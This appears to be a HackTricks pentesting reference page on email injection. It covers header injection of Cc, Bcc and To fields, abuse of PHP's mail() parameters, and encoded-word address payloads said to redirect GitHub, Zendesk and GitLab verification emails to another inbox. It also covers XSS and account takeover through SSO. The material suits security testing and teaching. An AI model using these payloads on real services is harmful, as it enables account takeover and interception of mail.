_body: "# Email Injections\n\n{{#include ../banners/hacktricks-training.md}}\n\n## Inject in sent e-mail\n\n### Inject Cc\
  \ and Bcc after sender argument\n\n```\nFrom:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com\n```\n\
  \nThe message will be sent to the recipient and recipient1 accounts.\n\n### Inject argument\n\n```\nFrom:sender@domain.com%0ATo:attacker@domain.com\n\
  ```\n\nThe message will be sent to the original recipient and the attacker account.\n\n### Inject Subject argument\n\n```\n\
  From:sender@domain.com%0ASubject:This is%20Fake%20Subject\n```\n\nThe fake subject will be added to the original subject\
  \ and in some cases will replace it. It depends on the mail service behavior.\n\n### Change the body of the message\n\n\
  Inject a two-line feed, then write your message to change the body of the message.\n\n```\nFrom:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.\n\
  ```\n\n### PHP mail() function exploitation\n\n```bash\n# The function has the following definition:\n\nphp --rf mail\n\n\
  Function [ <internal:standard> function mail ] {\n  - Parameters [5] {\n    Parameter #0 [ <required> $to ]\n    Parameter\
  \ #1 [ <required> $subject ]\n    Parameter #2 [ <required> $message ]\n    Parameter #3 [ <optional> $additional_headers\
  \ ]\n    Parameter #4 [ <optional> $additional_parameters ]\n  }\n}\n```\n\n#### The 5th parameter ($additional_parameters)\n\
  \nThis section is going to be based on **how to abuse this parameter supposing that an attacker controls it**.\n\nThis parameter\
  \ is going to be added to the command line PHP will be using to invoke the binary sendmail. However, it will be sanitised\
  \ with the function `escapeshellcmd($additional_parameters)`.\n\nAn attacker can **inject extract parameters for sendmail**\
  \ in this case.\n\n#### Differences in the implementation of /usr/sbin/sendmail\n\n**sendmail** interface is **provided\
  \ by the MTA email software** (Sendmail, Postfix, Exim etc.) installed on the system. Although the **basic functionality**\
  \ (such as -t -i -f parameters) remains the **same** for compatibility reasons, **other functions and parameters** vary\
  \ greatly depending on the MTA installed.\n\nHere are a few examples of different man pages of sendmail command/interface:\n\
  \n- Sendmail MTA: http://www.sendmail.org/\\~ca/email/man/sendmail.html\n- Postfix MTA: http://www.postfix.org/mailq.1.html\n\
  - Exim MTA: https://linux.die.net/man/8/eximReferences\n\nDepending on the **origin of the sendmail** binary different options\
  \ have been discovered to abuse them and l**eak files or even execute arbitrary commands**. Check how in [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)\n\
  \n## Inject in the e-mail name\n\n> [!CAUTION]\n> Note that if you manage to create an account in a service with an arbitrary\
  \ domain name (like Github, Gitlab, CloudFlare Zero trust...) and verify it receiving the verification email in your mail\
  \ address, you might be able to access sensitive locations of the victim company\n\n### Ignored parts of an email\n\nThe\
  \ symbols: **+, -** and **{}** in rare occasions can be used for tagging and ignored by most e-mail servers\n\n- E.g. john.doe+intigriti@example.com\
  \ → john.doe@example.com\n\n**Comments between parentheses ()** at the beginning or the end will also be ignored\n\n- E.g.\
  \ john.doe(intigriti)@example.com → john.doe@example.com\n\n### Whitelist bypass\n\n<figure><img src=\"../images/image (812).png\"\
  \ alt=\"https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0\"><figcaption></figcaption></figure>\n\n### Quotes\n\n<figure><img\
  \ src=\"../images/image (626).png\" alt=\"https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0\"><figcaption></figcaption></figure>\n\
  \n### IPs\n\nYou can also use IPs as domain named between square brackets:\n\n- john.doe@\\[127.0.0.1]\n- john.doe@\\[IPv6:2001:db8::1]\n\
  \n### Email Encoding\n\nAs explained in [**this research**](https://portswigger.net/research/splitting-the-email-atom),\
  \ email names also can also contain encoded characters:\n\n- **PHP 256 overflow**: PHP `chr` function will continue adding\
  \ 256 to a char until it becames positive and then do the operation `%256`.\n  - `String.fromCodePoint(0x10000 + 0x40) //\
  \ \U00010040 → @`\n\n> [!TIP]\n> The goal of this trick is to end with an injection like `RCPT TO:<\"collab@psres.net>collab\"\
  @example.com>`\\\n> that will send the verification email to a different email address from the expected one (therefore\
  \ to introduce another email address inside the email name and break the syntax when sending the email)\n\nDifferent encodings:\n\
  \n```bash\n# Format\n=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com\n\n# =? -> Start of encode\n# utf-8\
  \ -> encoding used\n# ? -> separator\n# q -> type of encoding\n# ? -> separator\n# =41=42=43 -> Hex encoded data\n# ?= end\
  \ of encoding\n\n# Other encodings, same example:\n# iso-8859-1\n=?iso-8859-1?q?=61=62=63?=hi@example.com\n# utf-8\n=?utf-8?q?=61=62=63?=hi@example.com\n\
  # utf-7\n=?utf-7?q?<utf-7 encoded string>?=hi@example.com\n# q encoding + utf-7\n=?utf-7?q?&=41<utf-7 encoded string without\
  \ initial A>?=hi@example.com\n# base64\n=?utf-8?b?QUJD?=hi@example.com\n# bas64 + utf-7\n=?utf-7?q?<utf-7 encoded string\
  \ in base64>?=hi@example.com\n#punycode\nx@xn--svg/-9x6 → x@<svg/\n```\n\nPayloads:\n\n- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`\n\
  \  - Note the encoded `@` as =40, the encoded `>` as `=3e` and `null` as `=00`\n  - It'll send the verification email to\
  \ `collab@psres.net`\n- Zendesk: `\"=?x?q?collab=22=40psres.net=3e=00==3c22x?=\"@example.com`\n  - Same trick as before\
  \ but adding some regular quote at the beginning and encoded qoute `=22` before the encoded `@` and then starting and close\
  \ some qoutes before the next email to fix the syntax used internally by Zendesk\n  - It'll send the verification email\
  \ to `collab@psres.net`\n- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`\n  - Note the use of the underscore as a\
  \ space to separate address\n  - It'll send the verification email to `collab@psres.net`\n- Punycode: Using Punycode it\
  \ was possible to inject a tag `<style` in Joomla and abuse it to steal the CSRF token via CSS exfiltration.\n\n#### Tooling\n\
  \n- There is a **Burp Suite Turbo Intruder script** to fuzz these kind of combinations to try to attack email formats. The\
  \ script already have potentially working combinations.\n- It's laso possible to use [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)\
  \ to create an email splitting attack\n\n### Other vulns\n\n![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image\
  \ (1131).png>)\n\n## Third party SSO\n\n### XSS\n\nSome services like **github** or **salesforce allows** you to create\
  \ an **email address with XSS payloads on it**. If you can **use this providers to login on other services** and this services\
  \ **aren't sanitising** correctly the email, you could cause **XSS**.\n\n### Account-Takeover\n\nIf a **SSO service** allows\
  \ you to **create an account without verifying the given email address** (like **salesforce**) and then you can use that\
  \ account to **login in a different service** that **trusts** salesforce, you could access any account.\\\n_Note that salesforce\
  \ indicates if the given email was or not verified but so the application should take into account this info._\n\n## Reply-To\n\
  \nYou can send an email using _**From: company.com**_ and _**Replay-To: attacker.com**_ and if any **automatic reply** is\
  \ sent due to the email was sent **from** an **internal address** the **attacker** may be able to **receive** that **response**.\n\
  \n## Hard Bounce Rate\n\nCertain services, like AWS, implement a threshold known as the **Hard Bounce Rate**, typically\
  \ set at 10%. This is a critical metric, especially for email delivery services. When this rate is exceeded, the service,\
  \ such as AWS's email service, may be suspended or blocked.\n\nA **hard bounce** refers to an **email** that has been returned\
  \ to the sender because the recipient's address is invalid or non-existent. This could occur due to various reasons, such\
  \ as the **email** being sent to a non-existing address, a domain that isn't real, or the recipient server's refusal to\
  \ accept **emails**.\n\nIn the context of AWS, if you send 1000 emails and 100 of them result in hard bounces (due to reasons\
  \ like invalid addresses or domains), this would mean a 10% hard bounce rate. Reaching or exceeding this rate can trigger\
  \ AWS SES (Simple Email Service) to block or suspend your email sending capabilities.\n\nIt's crucial to maintain a low\
  \ hard bounce rate to ensure uninterrupted email service and maintain sender reputation. Monitoring and managing the quality\
  \ of the email addresses in your mailing lists can significantly help in achieving this.\n\nFor more detailed information,\
  \ AWS's official documentation on handling bounces and complaints can be referred to [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).\n\
